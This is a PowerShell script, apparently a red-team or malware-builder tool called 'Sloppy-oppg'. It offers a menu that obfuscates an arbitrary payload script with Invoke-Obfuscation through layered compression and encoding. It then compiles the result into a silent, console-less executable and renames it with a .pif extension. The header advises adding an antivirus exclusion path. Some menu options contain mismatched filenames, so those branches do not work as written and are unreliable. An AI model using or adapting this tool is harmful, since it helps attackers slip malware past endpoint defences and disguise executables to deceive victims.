# Sloppy-oppg.ps1
#
# Author : P.Hoogeveeen
# AKA    : x0xr00t
# Taam   : sl0ppyroot
#
# this is a menu to gen automated obfuscated ps code 
#
# place files under C:\
# add exlusion path C:\sl0ppy-oppg
#
# gen obfuscated payload and copy to clipboard... without output to file 
#Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\users\x0\Desktop\sl0ppy-winvasion\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,clip'
# gen obfuscated payload with output to file
#Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\users\x0\Desktop\sl0ppy-winvasion\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\users\x0\Desktop\output.ps1' 
mkdir C:\sl0ppy-payload
function Show-Menu {
    param (
        [string]$Title = 'Sl0ppy-oppg'
    )
    Clear-Host
    write-host ""
    Write-Host "================ $Title ================"
    
    Write-Host "1: Press '1' For Compression+SecureString+Output."
    Write-Host "2: Press '2' For Dubble-Compression+SecureString+Output."
    Write-Host "3: Press '3' For Tripple-Compression+SecureString+Output."
    Write-Host "4: Press '4' For Compression+BXOR+Output."
    Write-Host "5: Press '5' For Dubble-Compression+BXOR+Output."
    Write-Host "6: Press '6' For Tripple-Compression+BXOR+Output."
    Write-Host "7: Press '7' For Compression+Octal+Output."
    Write-Host "8: Press '8' For Dubble-Compression+Octal+Output."
    Write-Host "9: Press '9' For Tripple-Compression+Octal+Output."   
    Write-Host "10: Press '10' For Compression+Whitespace+Output."
    Write-Host "11: Press '11' For Dubble-Compression+Whitespace+Output."
    Write-Host "12: Press '12' For Tripple-Compression+Whitespace+Output."
    Write-Host "Q: Press 'Q' To Quit."
}

do
 {
    Show-Menu
    $selection = Read-Host "Please make a selection"
    switch ($selection)
    {
    '1' {
    'You chose option Compression+SecureString+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-css-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-css-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-css-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-css-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-css.exe -noConsole -noError -title "sl0ppy-css" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-css.exe" -NewName "C:\sl0ppy-payload\sl0ppy-css.pif"	
    } '2' {
    'You chose option Dubble-Compression+SecureString+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-dcss-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-dcss.exe -noConsole -noError -title "sl0ppy-dcss" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dcss.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dcss.pif"	
    } '3' {
    'You chose option Tripple-Compression+SecureString+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-tcss-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tcss.exe -noConsole -noError -title "sl0ppy-tcss" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tcss.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tcss.pif"	
    } '4' {
    'You chose option Compression+BXOR+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-bc-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-bc-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-bc-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-bc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-bc.exe -noConsole -noError -title "sl0ppy-bc" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-bc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-bc.pif"	
    } '5' {
    'You chose option Dubble-Compression+BXOR+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-dbc-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-bc.exe -noConsole -noError -title "sl0ppy-dcb" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dbc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dbc.pif"
    } '6' {
    'You chose option Tripple-Compression+BXOR+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-tbc-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tc.exe -noConsole -noError -title "sl0ppy-tcb" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tbc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tbc.pif"  
    } '7' {
    'You chose option Compression+Octal+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\3,encoding\3,encoding\3,out C:\sl0ppy-payload\sl0ppy-co-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-co-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-co-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-co-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-co.exe -noConsole -noError -title "sl0ppy-co" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-co.exe" -NewName "C:\sl0ppy-payload\sl0ppy-co.pif"	
    } '8' {
    'You chose option Dubble-Compression+Octal+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\3,encoding\3,encoding\3,out C:\sl0ppy-payload\sl0ppy-dco-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dco-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dco-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dco-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-dco.exe -noConsole -noError -title "sl0ppy-dco" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dco.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dco.pif"	
    } '9' {
    'You chose option Tripple-Compression+Octal+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\3,encoding\3,encoding\3,out C:\sl0ppy-payload\sl0ppy-tco-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tco-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tco-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tco-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tco.exe -noConsole -noError -title "sl0ppy-tco" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tco.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tco.pif"	  
    } '10' {
    'You chose option Compression+Whitespace+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\8,encoding\8,encoding\8,out C:\sl0ppy-payload\sl0ppy-cw-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-cw-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-cw-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-cw-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-cw.exe -noConsole -noError -title "sl0ppy-cw" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-cw.exe" -NewName "C:\sl0ppy-payload\sl0ppy-cw.pif"	
    } '11' {
    'You chose option Dubble-Compression+Whitespace+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\8,encoding\8,encoding\8,out C:\sl0ppy-payload\sl0ppy-dcw-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcw-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcw-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dcw-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-dcw.exe -noConsole -noError -title "sl0ppy-dcw" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dcw.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dcw.pif"	
    } '12' {
    'You chose option Tripple-CCompression+Whitespace+Output'
	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\8,encoding\8,encoding\8,out C:\sl0ppy-payload\sl0ppy-tcw-output.ps1'
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcw-output.ps1 "powershell "  
	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcw-output.ps1 '$()'
	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tcw-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tcw.exe -noConsole -noError -title "sl0ppy-tcw" -version 0.0.0.1
	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tcw.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tcw.pif"	
    } 
    }
    pause
 }
 until ($selection -eq 'q')

